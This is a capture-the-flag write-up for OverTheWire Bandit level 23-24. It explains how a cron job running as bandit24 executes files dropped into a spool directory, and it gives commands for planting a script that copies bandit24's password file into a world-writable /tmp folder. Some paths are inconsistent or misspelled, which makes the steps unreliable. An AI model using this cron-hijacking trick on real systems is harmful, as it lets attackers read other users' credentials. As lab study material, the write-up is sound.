##Bandit level 23-24



###Objective
Identify the cron job executed for the next level,analyze the script behavior, and exploit it to retrieve the password for the next user



###Approach
-Navigated to the cron configuration directory
-Identified the relevant cron job fileand found that it executes:

    /usr/bin/cronjob_bandit24.sh 
on a scheduled basis

-Analyzed the script:

    #!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done

-The cron job runs as bandit24
    -It scans /var/spool/bandit23/foo
    -Executes any file that is a regular file and owned by bandit23
    -After execution it deletes the file immediatly

-Taking advantage i created a working directory /tmp to make an script
    #!/bin/bash

    cat /etc/bandit_pass/bandit24 > /tmp/script/password.txt

-Made it executable and copied it into the cron-executed directory

-Waited for the cron job to execeute
-Retrieved the password from my password.txt file
-Used the password to authenticate in the next level


###Commands used
cd /etc/cron.d
ls
cat cronjob_bandit24
cat  /usr/bin/cronjob_bandit24.sh
 mkdir -p /tmp/script
   nano /tmp/script/steal.sh
#Created the script:

    #!/bin/bash

    cat /etc/bandit_pass/bandit24 > /tmp/script/password.txt

chmod +x /tmp/script/steal.sh
 chmod 777 /tmp/script
  cp /tmp/script/steal.sh /var/spool/badit24/foo/steal.sh
 cd /tmp/script/
 cat password.txt


 ssh bandit24@bandit.labs.overthewire.org -p 2220





###Key concepts learned

-Cron jobs can execute user-influenced scripts,creating a code execution surface
-File ownership checks are not sufficient security if an attacker-files can be introduced
-/var/spool/ directories used by automation systems are high-risk execution zones
